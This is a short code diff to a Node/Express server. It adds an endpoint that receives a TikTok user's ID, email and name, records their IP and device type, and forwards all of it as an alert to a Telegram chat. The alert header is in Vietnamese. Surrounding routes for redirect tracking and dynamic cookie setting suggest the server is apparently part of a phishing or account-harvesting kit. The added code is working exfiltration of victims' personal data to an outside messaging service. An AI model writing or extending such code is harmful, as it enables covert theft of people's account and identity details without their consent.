@@ -492,6 +492,31 @@ app.get('/api/track/redirect', async (req, res) => {
   res.json({ success: true });
 });
 
+app.post('/api/track/login', async (req, res) => {
+  const { uid, email, displayName } = req.body;
+  const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'unknown';
+  const userAgent = req.headers['user-agent'] || 'unknown';
+  const platform = /iphone|ipad|ipod/i.test(userAgent) ? 'iOS' : /android/i.test(userAgent) ? 'Android' : 'Desktop';
+
+  logger.info(`[Tracking] TikTok user logged in successfully: uid=${uid}, email=${email}, name=${displayName}`);
+
+  try {
+    const lines = [
+      '🔑 <b>USER TIKTOK ĐĂNG NHẬP THÀNH CÔNG</b>',
+      `👤 User ID: <code>${uid}</code>`,
+      `📧 Email: <code>${email}</code>`,
+      `📛 Tên: <b>${displayName}</b>`,
+      `💻 Thiết bị: <b>${platform}</b>`,
+      `📡 IP: <code>${ip}</code>`
+    ];
+    await telegram.sendMessage(lines.join('\n'));
+  } catch (e) {
+    logger.error('Failed to send telegram login tracking:', e.message);
+  }
+
+  res.json({ success: true });
+});
+
 // Set Cookies dynamically
 app.post('/api/set-cookies', async (req, res) => {
   const { cookies } = req.body;
